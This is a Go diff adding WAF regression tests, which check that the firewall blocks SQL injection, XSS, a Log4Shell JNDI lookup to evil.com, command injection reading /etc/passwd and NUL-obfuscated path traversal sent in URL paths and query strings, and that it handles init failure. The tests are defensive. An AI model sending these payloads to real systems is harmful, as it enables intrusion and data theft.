@@ -5,6 +5,7 @@ import (
 	"io"
 	"net/http"
 	"net/http/httptest"
+	"net/url"
 	"strings"
 	"testing"
 
@@ -106,6 +107,34 @@ func TestWAF_InspectsArgsAndForms(t *testing.T) {
 	}
 }
 
+// TestWAF_InspectsRequestURI is a regression test for VULN-M01: the built-in
+// ruleset only inspected ARGS (query-string/body params), never REQUEST_URI,
+// so a payload embedded directly in a REST path segment (/api/orders/{payload}
+// rather than /api/orders?id={payload}) sailed through every rule untouched.
+func TestWAF_InspectsRequestURI(t *testing.T) {
+	h := wafTestHandler(t)
+
+	cases := map[string]string{
+		"path SQLi":      "/api/orders/1' UNION SELECT username,password FROM users--",
+		"path XSS":       "/search/<script>alert(1)</script>",
+		"path Log4Shell": "/api/items/${jndi:ldap://evil.com/a}",
+		"path bool SQLi": "/api/x/1' OR '1'='1",
+	}
+	for name, path := range cases {
+		// Build via url.URL so the raw payload is percent-encoded into a valid
+		// request line — the point of the test is that Coraza's REQUEST_URI
+		// variable still decodes and inspects it, exactly like a real client
+		// sending the same characters over the wire would.
+		u := &url.URL{Path: path}
+		r := httptest.NewRequest(http.MethodGet, u.String(), nil)
+		rec := httptest.NewRecorder()
+		h.ServeHTTP(rec, r)
+		if rec.Code != http.StatusForbidden {
+			t.Errorf("%s: path-embedded payload not blocked: got %d, want 403 (path=%q)", name, rec.Code, path)
+		}
+	}
+}
+
 // TestWAF_InspectsHeaders guards against injection payloads smuggled in
 // arbitrary request headers (e.g. X-Search), while not false-positiving on a
 // JWT in Authorization.
@@ -147,6 +176,60 @@ func TestWAF_AllowsBenign(t *testing.T) {
 	}
 	if code := wafDo(t, h, http.MethodGet, "/api/v1/users", "", ""); code != http.StatusOK {
 		t.Errorf("benign GET wrongly blocked: got %d, want 200", code)
+	}
+}
+
+// TestWAF_NullByteObfuscationBlocked is a regression test for VULN-803: the
+// built-in SQLi/RCE/path-traversal rules only carried t:urlDecodeUni, so a
+// percent-encoded NUL byte injected mid-keyword decoded to a raw NUL that
+// split the match and slipped through the (?i)keyword regex. t:removeNulls
+// now strips it before the regex runs.
+func TestWAF_NullByteObfuscationBlocked(t *testing.T) {
+	h := wafTestHandler(t)
+
+	cases := map[string]string{
+		"SQLi with encoded NUL":      "/x?q=uni%00on%20select%20from%20users",
+		"RCE with encoded NUL":       "/x?q=%3B%00cat%20/etc/passwd",
+		"traversal with encoded NUL": "/x?q=..%00/../../etc/passwd",
+	}
+	for name, target := range cases {
+		if code := wafDo(t, h, http.MethodGet, target, "", ""); code != http.StatusForbidden {
+			t.Errorf("%s: not blocked: got %d, want 403", name, code)
+		}
+	}
+}
+
+// TestWAF_InitFailure_DefaultPassthrough_ButCounted is a regression test for
+// VULN-801: a WAF that fails to initialise (here, a RulesetPath pointing at a
+// nonexistent file) must not go silent — it always increments waf_init_failed
+// — and by default (FailClosed: false) still passes traffic through rather
+// than taking the gateway down.
+func TestWAF_InitFailure_DefaultPassthrough_ButCounted(t *testing.T) {
+	st := &fakeStore{}
+	mw := WAF(config.WAFConfig{Enabled: true, RulesetPath: "/nonexistent/ruleset.conf"}, fakeLogger{}, st)
+	h := mw(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusOK) }))
+
+	if code := wafDo(t, h, http.MethodPost, "/x", "application/json", `{"q":"union select from users"}`); code != http.StatusOK {
+		t.Errorf("default (fail-open) init failure should pass traffic through: got %d", code)
+	}
+	if st.metrics["waf_init_failed"] != 1 {
+		t.Errorf("waf_init_failed metric = %d, want 1 (VULN-801: failure must not be silent)", st.metrics["waf_init_failed"])
+	}
+}
+
+// TestWAF_InitFailure_FailClosed_DeniesTraffic covers the opt-in
+// FailClosed: true side of VULN-801: an init failure must deny every request
+// (503) instead of ever silently disabling protection.
+func TestWAF_InitFailure_FailClosed_DeniesTraffic(t *testing.T) {
+	st := &fakeStore{}
+	mw := WAF(config.WAFConfig{Enabled: true, RulesetPath: "/nonexistent/ruleset.conf", FailClosed: true}, fakeLogger{}, st)
+	h := mw(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusOK) }))
+
+	if code := wafDo(t, h, http.MethodGet, "/x", "", ""); code != http.StatusServiceUnavailable {
+		t.Errorf("fail_closed init failure should deny traffic: got %d, want 503", code)
+	}
+	if st.metrics["waf_init_failed"] != 1 {
+		t.Errorf("waf_init_failed metric = %d, want 1", st.metrics["waf_init_failed"])
 	}
 }
 
